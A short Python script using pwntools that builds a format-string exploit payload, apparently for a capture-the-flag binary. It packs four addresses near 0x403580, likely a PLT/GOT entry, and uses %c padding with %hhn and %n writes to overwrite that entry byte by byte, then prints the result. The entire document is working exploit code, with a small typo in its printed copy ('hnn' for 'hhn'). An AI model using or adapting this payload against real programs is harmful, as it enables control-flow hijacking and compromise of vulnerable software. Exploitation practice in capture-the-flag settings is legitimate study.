from pwn import *

plt_addr_1 = p64(0x403580 + 0, "little")
plt_addr_2 = p64(0x403580 + 1, "little")
plt_addr_3 = p64(0x403580 + 2, "little")
plt_addr_4 = p64(0x403580 + 3, "little")
#           133       134     135      136     137
payload = (
    b"%214c%139$hhn%59c%140$hhn%47c%141$n%192c%142$hhn"
    + plt_addr_1
    + plt_addr_2
    + plt_addr_3
    + plt_addr_4
)

print(payload)
print(len(payload))
print(
    b"%214c%139$hnn%59c%140$hhn%47c%141$n%192c%142$hhn\x805@\x00\x00\x00\x00\x00\x815@\x00\x00\x00\x00\x00\x825@\x00\x00\x00\x00\x00\x835@\x00\x00\x00\x00\x00"
)
